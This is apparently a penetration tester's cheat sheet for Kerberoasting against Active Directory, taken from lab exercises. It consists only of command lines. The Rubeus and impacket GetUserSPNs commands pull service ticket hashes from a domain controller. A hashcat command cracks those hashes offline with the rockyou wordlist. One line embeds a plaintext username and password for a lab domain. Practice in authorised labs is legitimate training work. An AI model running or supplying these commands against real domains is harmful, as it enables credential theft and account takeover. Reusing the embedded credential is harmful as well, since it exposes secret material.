

```
Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```
sudo impacket-GetUserSPNs -request -dc-ip TARGET corp.com/pete
```

```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

```
GetUserSPNs.py hutch.offsec/fmcsorley:CrabSharkJellyfish192 -dc-ip TARGET
```

```
impacket-GetUserSPNs -dc-ip TARGET -request -outputfile hashes.roast nagoya-industries.com/Fiona.Clark
```

```
sudo impacket-GetUserSPNs -request -dc-ip TARGET corp.com/meg
```

